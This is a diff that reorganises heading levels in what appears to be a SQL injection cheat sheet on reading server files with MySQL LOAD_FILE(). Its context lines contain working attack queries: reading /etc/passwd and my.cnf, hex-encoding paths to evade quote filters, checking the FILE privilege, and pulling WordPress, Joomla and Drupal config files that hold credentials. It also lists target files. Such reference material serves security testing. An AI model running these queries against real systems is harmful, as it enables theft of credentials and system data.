@@ -7,11 +7,9 @@ tags: ["file operations", "load_file", "privilege escalation"]
 lastUpdated: 2025-03-15
 ---
 
-## Reading Files
-
 MySQL provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To read files from the MySQL server, the following conditions must be met:
 
@@ -20,7 +18,7 @@ To read files from the MySQL server, the following conditions must be met:
 3. You must know the absolute path to the file
 4. The file size must be less than `max_allowed_packet` (default 1MB to 4MB)
 
-### LOAD_FILE() Function
+## LOAD_FILE() Function
 
 The primary method for reading files is the `LOAD_FILE()` function:
 
@@ -30,7 +28,7 @@ SELECT LOAD_FILE('/etc/passwd');
 
 This function returns the file contents as a string or NULL if the file doesn't exist or isn't readable.
 
-#### Hex Encoding to Bypass Filters
+### Hex Encoding to Bypass Filters
 
 Use hex encoding to avoid quote filters:
 
@@ -42,7 +40,7 @@ SELECT LOAD_FILE(0x2F6574632F706173737764);
 SELECT LOAD_FILE(0x2F6574632F6D792E636E66);
 ```
 
-### Checking for FILE Privilege
+## Checking for FILE Privilege
 
 Before attempting to read files, check if the current user has the necessary privilege:
 
@@ -56,7 +54,7 @@ WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%")
 AND privilege_type = 'FILE';
 ```
 
-### Important Target Files
+## Important Target Files
 
 Common valuable files to read:
 
@@ -75,9 +73,9 @@ Common valuable files to read:
 | `/var/log/apache2/access.log`        | Web server logs                            |
 | `/var/log/mysql/error.log`           | MySQL error logs                           |
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Reading Binary Files
+### Reading Binary Files
 
 Binary files can be read and converted to hexadecimal:
 
@@ -85,7 +83,7 @@ Binary files can be read and converted to hexadecimal:
 SELECT HEX(LOAD_FILE('/bin/ls'));
 ```
 
-#### Determining Web Root Path
+### Determining Web Root Path
 
 If you don't know the web server's document root:
 
@@ -100,7 +98,7 @@ SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
 SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
 ```
 
-#### Dealing with Known File Paths
+### Dealing with Known File Paths
 
 If exact path is unknown, try multiple possible locations:
 
@@ -110,9 +108,9 @@ SELECT LOAD_FILE(CONCAT('/var/www/html/', 'config.php'));
 SELECT LOAD_FILE(CONCAT('/var/www/site/', 'config.php'));
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Reading Database Configuration
+### Reading Database Configuration
 
 ```sql
 -- Check for common configuration files
@@ -122,7 +120,7 @@ SELECT LOAD_FILE('/var/www/html/configuration.php');   -- Joomla
 SELECT LOAD_FILE('/var/www/html/sites/default/settings.php');  -- Drupal
 ```
 
-#### Reading System Information
+### Reading System Information
 
 ```sql
 -- Get /etc/passwd to identify users
@@ -132,7 +130,7 @@ SELECT LOAD_FILE('/etc/passwd');
 SELECT LOAD_FILE('/etc/my.cnf');
 ```
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file access:
 
